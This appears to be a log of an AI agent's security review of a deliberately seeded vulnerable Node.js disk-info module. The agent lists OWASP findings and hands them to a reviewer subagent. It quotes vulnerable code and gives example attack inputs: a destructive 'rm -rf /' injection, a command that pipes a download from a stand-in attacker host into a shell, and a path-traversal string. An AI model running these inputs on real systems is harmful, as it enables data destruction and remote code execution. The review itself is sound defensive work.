{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01UBeLG1soZS1Rphce7BoZGf","type":"message","role":"assistant","content":[{"type":"thinking","thinking":"Now I have all the information I need to conduct the security review. Let me compile the findings from `review-src/disk-info.ts`:\n\n1. **Command Injection (A03) - Line 35**: `exec('du -sh ' + path, ...)` - attacker-controlled `path` directly concatenated into a shell command. Input like `/; rm -rf /` executes arbitrary commands.\n\n2. **Path Traversal / Broken Access Control (A01) - Line 46**: `fsSize(path)` with unvalidated, attacker-controlled `path`. Allows traversal outside intended mount (e.g., `../../etc`).\n3. **Hardcoded Credential (A07) - Line 20**: A live API key is embedded directly in the source code, making it accessible to anyone with repository access and impossible to rotate without code changes.\n\n4. **Cryptographic Failures / Plaintext Transmission (A02) - Lines 68-69**: The token gets sent over an unencrypted HTTP connection as a query parameter, exposing it in transit and in server/proxy logs.\n\n5. **Secondary Command Injection (A03) - Line 69**: Another shell command execution vulnerability where user input flows directly into a curl command.\n\n6. **Security Logging Failure (A09) - Lines 55-61**: Error handling silently swallows all exceptions without any logging, including security-critical failures.\n\n7. **Vulnerable Dependency (A06) - Lines 10-13**: The pinned version of `systeminformation` predates patches for known command-injection vulnerabilities.\n\nI'm now preparing this analysis for the security reviewer, focusing on the disk-information utility in the source file.\n\nThe threat model centers on the server's filesystem access, the hardcoded API token, and supply-chain risks. External attackers can exploit the command injection through crafted `mountPath` inputs to achieve full RCE, while path traversal enables filesystem disclosure and the hardcoded secret creates exfiltration risk. Silent error handling masks all these security failures.","signature":""}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1305,"cache_read_input_tokens":65698,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1305},"output_tokens":33,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"d9a1f0b2-3297-406f-91e0-9d229b405bdb","uuid":"a4ffd4ea-fa88-473a-94eb-1fef10bc4df5","request_id":"req_011CbqKWjpnoaQBDK3PAEQu7"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01UBeLG1soZS1Rphce7BoZGf","type":"message","role":"assistant","content":[{"type":"text","text":"I have all the findings. Now packaging the consultation for the security-reviewer agent."}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1305,"cache_read_input_tokens":65698,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1305},"output_tokens":33,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"d9a1f0b2-3297-406f-91e0-9d229b405bdb","uuid":"9d98cb8e-5556-4f5a-a3fe-11e2bfc8b474","request_id":"req_011CbqKWjpnoaQBDK3PAEQu7"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01UBeLG1soZS1Rphce7BoZGf","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01Vj3aBkH93gifZzqKi1NtpF","name":"Agent","input":{"description":"Security review of disk-info.ts module","subagent_type":"lz-advisor:security-reviewer","prompt":"## Review Scope\n\n`review-src/disk-info.ts` -- a Node.js disk-information utility module that accepts a user-supplied mount path and runs disk-usage commands. The module is seeded review material (not built or deployed), but all defects are real security anti-patterns that warrant OWASP findings.\n\n## Threat Model Context\n\n**Assets:**\n- Server filesystem accessible to the Node.js process (all paths)\n- API secret (`API_TOKEN` live key embedded in source)\n- Developer machines and CI/CD systems that clone the repo\n- Internal cache service at `cache.internal`\n\n**Threat actors:**\n- External HTTP callers who control the `mountPath` field in `DiskQuery`\n- Any developer or automated system with read access to the repository (obtain hardcoded token)\n- A malicious dependency in the supply chain (`systeminformation@3.42.0` pre-advisory pin)\n\n**Blast radius:**\n- Full remote code execution on the server via command injection into `exec('du -sh ' + path)`\n- Arbitrary filesystem read/traversal via unvalidated `path` passed to `fsSize`\n- Live API token exposed to every repository reader; secret cannot be rotated without a code push\n- Token exfiltrated over `http://` query parameter, visible in access logs and to any MITM\n- Security-relevant failures silently discarded, blocking incident detection\n\n## Findings\n\n1. **Command injection via `exec('du -sh ' + path)` -- Line 35**\n   - File: `review-src/disk-info.ts:35`\n   - Severity (initial): Critical\n   - OWASP: A03 Injection\n   - Description: `query.mountPath` arrives from the caller with no allow-list, charset, or length validation. It is string-concatenated directly into a shell command and passed to Node's `exec`. Input such as `\"/; rm -rf /\"` or `\"$(curl attacker.com|sh)\"` executes arbitrary shell commands with the Node process's privileges.\n   - Code context:\n   ```typescript\n   exec('du -sh ' + path, (err, stdout) => {\n     if (err) { return; }\n     cacheResult(stdout);\n   });\n   ```\n\n2. **Path traversal into `fsSize` -- Line 46**\n   - File: `review-src/disk-info.ts:46`\n   - Severity (initial): Critical\n   - OWASP: A01 Broken Access Control\n   - Description: The same unvalidated `path` flows into `fsSize(path)` from `systeminformation`. An attacker supplies `../../etc` or any absolute path outside the intended mount to enumerate filesystem structure, read directory sizes, or probe for sensitive mount points.\n   - Code context:\n   ```typescript\n   const size = await fsSize(path);\n   return { path, size };\n   ```\n\n3. **Hardcoded live API token in source -- Line 20**\n   - File: `review-src/disk-info.ts:20`\n   - Severity (initial): Critical\n   - OWASP: A07 Identification and Authentication Failures\n   - Description: A live `sk_live_` prefixed API key is hardcoded as a module-level constant. Every developer, CI runner, or contributor with repository read access obtains the secret. The token cannot be rotated without a code change and a deployment. The key also flows into an HTTP request (Finding 4), compounding exposure.\n   - Code context:\n   ```typescript\n   const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n   ```\n\n4. **Token transmitted over `http://` as a query parameter -- Lines 68-69**\n   - File: `review-src/disk-info.ts:68-69`\n   - Severity (initial): Critical\n   - OWASP: A02 Cryptographic Failures\n   - Description: `writeCache` constructs a URL with scheme `http://` and appends `API_TOKEN` as a query parameter. This exposes the live secret in: (a) network traffic readable by any on-path observer, (b) server access logs at `cache.internal`, (c) any proxy or load-balancer log. Additionally, `JSON.stringify(parsed)` is appended inside single-quotes in the shell command, creating a secondary injection vector: crafted cached data can break the quote boundary and inject further shell commands.\n   - Code context:\n   ```typescript\n   const url = 'http://cache.internal/store?token=' + API_TOKEN;\n   void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n   ```\n\n5. **Security events silently discarded -- Lines 55-61**\n   - File: `review-src/disk-info.ts:55-61`\n   - Severity (initial): Important\n   - OWASP: A09 Security Logging and Monitoring Failures\n   - Description: The `catch` block in `cacheResult` silently discards every error -- including security-relevant parse failures and cache write failures -- with no logging, no metric, and no rethrow. Successful exploitation of the command-injection or path-traversal paths may trigger parser errors that would otherwise be the only signal an incident occurred.\n   - Code context:\n   ```typescript\n   try {\n     const parsed = JSON.parse(stdout);\n     writeCache(parsed);\n   } catch (_) {\n     // swallowed\n   }\n   ```\n\n6. **Outdated dependency pin -- Lines 10-13 (comment / import)**\n   - File: `review-src/disk-info.ts:14-15`\n   - Severity (initial): Important\n   - OWASP: A06 Vulnerable and Outdated Components\n   - Description: The module declares `systeminformation@3.42.0` -- a version predating command-injection advisories patched in later major releases. The import of `fsSize` from this version means any vulnerability in its internal shell invocations is also in scope. Transitive pins at outdated minor/major versions are undetected by standard `npm audit` when the dependency is not directly in `package.json`.\n   - Code context:\n   ```typescript\n   // \"systeminformation\": \"3.42.0\"  -- vulnerable dep pin\n   import { fsSize } from 'systeminformation';\n   ```\n\n## Request\n\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Identify any attack chains (e.g., Finding 1 feeds Finding 4's secondary injection, or hardcoded token in Finding 3 compounds Finding 4). Flag any additional vulnerabilities the scan may have missed, particularly around the secondary `exec` in `writeCache` (line 69).\n"},"caller":{"type":"direct"}}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1305,"cache_read_input_tokens":65698,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1305},"output_tokens":33,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"d9a1f0b2-3297-406f-91e0-9d229b405bdb","uuid":"028f906d-5fcf-4b3d-b559-f1323088f439","request_id":"req_011CbqKWjpnoaQBDK3PAEQu7"}
